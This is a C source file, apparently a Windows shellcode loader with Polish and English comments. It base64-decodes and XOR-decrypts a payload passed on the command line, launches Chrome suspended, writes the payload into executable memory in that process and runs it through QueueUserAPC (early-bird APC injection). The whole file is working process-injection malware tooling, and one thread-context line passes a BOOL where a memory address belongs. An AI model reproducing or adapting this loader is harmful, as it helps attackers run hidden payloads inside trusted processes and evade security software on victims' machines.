/*CreateProcessA, VirtualAllocEx, WriteProcessMemory, QueueUserAPC, ResumeThread*/
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdint.h>
#include <wincrypt.h>
#include <string.h>
#pragma comment(lib, "crypt32.lib")


//decryptying xor
void deXOR(uint8_t *buffer, size_t bufferSize, const uint8_t *key, size_t keyLength) {
    if (keyLength == 0) return;
    for (size_t i = 0; i < bufferSize; i++) {
        buffer[i] ^= key[i % keyLength];
    }
}

//converting string "fc 48 83 e4..." to bytes
uint8_t* parseHexString(const char *input, size_t *outSize) {
    size_t len = strlen(input);
    *outSize = 0;

//counting bytes
    for (size_t i = 0; i < len; i++) {
        if (input[i] != ' ') (*outSize)++;
    }
    *outSize /= 2;

    uint8_t *bytes = (uint8_t*)malloc(*outSize);
    if (!bytes) {
        printf("[-] Błąd: Brak pamięci!\n");
        return NULL;
    }

    size_t index = 0;
    for (size_t i = 0; i < len; i += 3) {
        sscanf(&input[i], "%2hhx", &bytes[index++]);
    }

    return bytes;
}

int main(int argc, char *argv[]){


//retrieving payload in b64 and encryption key as start parameter
    if (argc != 3) {
        printf("Użycie: %s \"tekst do konwersji\" <base64_string>\n", argv[0]);
        return 1;
    }
    char *input1 = argv[2]; //key

const char* base64String = argv[1];
DWORD shellcodeSize = 0;
BYTE* shellcode = NULL;

//b64 decoding
if (!CryptStringToBinaryA(
    base64String,
    0,
    CRYPT_STRING_BASE64,
    NULL,
    &shellcodeSize,
    NULL,
    NULL)) {
    printf("[-] can't find a size of the data: %d\n", GetLastError());
    return 1;
}

//memory allocation for decoded data
shellcode = (BYTE*)malloc(shellcodeSize);
if (!shellcode) {
    printf("[-] memory alocation failed.\n");
    return 1;
}

// Właściwe dekodowanie
if (!CryptStringToBinaryA(
    base64String,
    0,
    CRYPT_STRING_BASE64,
    shellcode,
    &shellcodeSize,
    NULL,
    NULL)) {
    printf("Błąd dekodowania Base64: %d\n", GetLastError());
    free(shellcode);
    return 1;
}

  
    size_t keySize = strlen(input1);
    unsigned char key[keySize]; 
    for (size_t i = 0; i < keySize; i++) {
        key[i] = (unsigned char)input1[i];
    }
//decrypting payload

    unsigned char* decryptedData = (unsigned char*)malloc(shellcodeSize);
    memcpy(decryptedData, shellcode, shellcodeSize);
    deXOR(decryptedData, shellcodeSize, key, keySize);


//creating new process
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof(si)};

    BOOL hProcess = CreateProcessA(
        NULL, 
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 
        NULL,  
        NULL, 
        FALSE, 
        CREATE_SUSPENDED, 
        NULL,
        NULL,
        &si, 
        &pi 
    );
    if(hProcess == 0){
        printf("[-] process creation failed, error: [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] process has been created: [%d]\n", pi.dwProcessId);

//memory alocating in proces
    printf("[i] paylaod size: [%d]\n", shellcodeSize);// sprawdzam czy dobrze odczytuje payload
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//potrzbny pi.hProcess nie hProcess
    if (!remoteMem){
        printf("[-] memory alocation failed, error: [%d]\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    printf("[+] memory has been allocated: [%X]\n", remoteMem);


//writting memory into process
    SIZE_T written;
    BOOL writeMem = WriteProcessMemory(pi.hProcess, remoteMem, decryptedData, shellcodeSize, &written);
    if (writeMem == 0){
        printf("[-] WriteProcessMemory failed, error: [%d]\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    printf("[+] data has been written into memory [%d]\n", written);

// Step 5: Set the entry point of the process to the start of the shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] can't set up the thread context, error: [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    ctx.Rcx = (DWORD64)writeMem;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] can't set up the thread context, error: [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] context set up succesfully!\n");

    PTHREAD_START_ROUTINE* apcRoutine = remoteMem;

    
//set up APC(code is executin in existing thread) https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
    DWORD apcque = QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, 0);

//resuming thread with already written payload
    ResumeThread(pi.hThread);

 //cleaning   
 free(decryptedData);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
